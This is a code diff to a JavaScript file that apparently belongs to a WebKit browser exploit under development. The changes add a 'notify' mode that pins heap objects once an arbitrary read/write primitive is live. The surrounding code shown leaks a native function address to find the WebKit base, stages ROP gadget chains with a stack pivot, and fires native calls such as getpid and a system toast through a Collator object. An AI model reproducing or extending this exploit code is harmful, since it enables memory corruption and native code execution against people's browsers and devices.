@@ -87,10 +87,10 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     applyPivotHookForFire,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
-import { runCollatorNotify } from "./slopkit_notify.js";
+import { runCollatorNotify, pinNotifyHeap } from "./slopkit_notify.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bl";
+const BUILD_ID = "rw-20250830bm";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -287,6 +287,7 @@ let scanRenderPending = 0;
 let lkQuiet = false;
 let nativeQuiet = false;
 const notifyRetain = [];
+let notifyPrep = null;
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
 const _scanBytes = new Array(8);
 const _win16 = new Array(16);
@@ -4320,6 +4321,37 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
+/** Pin collator+arena @ PRIMITIVE-OK — skip heavy expm1 slab in notify mode. */
+function ensureNotifyPrep(p, off) {
+    if (notifyPrep) return notifyPrep;
+    let nativeFn = null;
+    let webkitBase = null;
+    try {
+        const cap = captureMainMfForPrep(p, off);
+        nativeFn = cap.nativeFn;
+        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
+    } catch (err) {
+        mark("NOTIFY-PREP-SKIP", "base: " + (err.message || String(err)));
+        return null;
+    }
+    notifyPrep = pinNotifyHeap({
+        p,
+        off,
+        leakval: p.leakval,
+        webkitBase,
+        nativeFn,
+        retain: notifyRetain,
+        params,
+        log: mark,
+        bufAddrOff: null,
+    });
+    for (let i = 0; i < notifyRetain.length; i++)
+        retained.push(notifyRetain[i]);
+    mark("NOTIFY-PREP", "pinned @ PRIMITIVE-OK — Fire notify after Accept fn");
+    return notifyPrep;
+}
+
 /** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
 function ensureNativePrep(p, off) {
     if (nativePrep) return nativePrep;
@@ -5152,8 +5184,9 @@ function runFireNotify() {
     try { crashLog.flushSync(); } catch (_) { }
 
     try {
-        for (let i = 0; i < notifyRetain.length; i++)
-            retained.push(notifyRetain[i]);
+        if (!notifyPrep) {
+            mark("NOTIFY-WARN", "no pinned prep — reload, Start first (before 2e)");
+        }
         const out = runCollatorNotify({
             p,
             off,
@@ -5165,6 +5198,7 @@ function runFireNotify() {
             params,
             log: mark,
             gdScan: params.get("gdscan") === "1",
+            pinned: notifyPrep,
         });
         if (out.sent) {
             mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
@@ -5507,29 +5541,35 @@ async function runStart() {
         mark("PRIMITIVE-OK", "arb rw live");
         pivotReady = true;
         const off = loadEffectiveOff();
+        const nm = getNativeMode();
         try {
-            ensureNativePrep(p, off);
-            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + getNativeMode());
-            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
-                + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
-            if (params.get("smoke") === "1" && nativeAllowed && getNativeMode() === "smoke") {
-                mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
-                renderOut();
-                try {
-                    firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
-                    mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
-                    state("pivot smoke OK @ Start", "ok");
-                } catch (smokeErr) {
-                    mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
-                }
+            if (nm === "notify" && params.get("prepslab") !== "1") {
+                ensureNotifyPrep(p, off);
+                mark("NATIVE-HINT", "notify mode — no expm1 slab (use ?prepslab=1 for bisect)");
             } else {
-                tryNativeFireAtStart(p, off);
+                ensureNativePrep(p, off);
+                mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
+                mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
+                    + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
+                if (params.get("smoke") === "1" && nativeAllowed && nm === "smoke") {
+                    mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
+                    renderOut();
+                    try {
+                        firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
+                        mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
+                        state("pivot smoke OK @ Start", "ok");
+                    } catch (smokeErr) {
+                        mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
+                    }
+                } else {
+                    tryNativeFireAtStart(p, off);
+                }
             }
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "2e Leak+lk → Fire notify (Collator) — or legacy Verify pivot for expm1");
+        mark("HINT", "Accept fn → Fire notify (collator pinned @ Start)");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
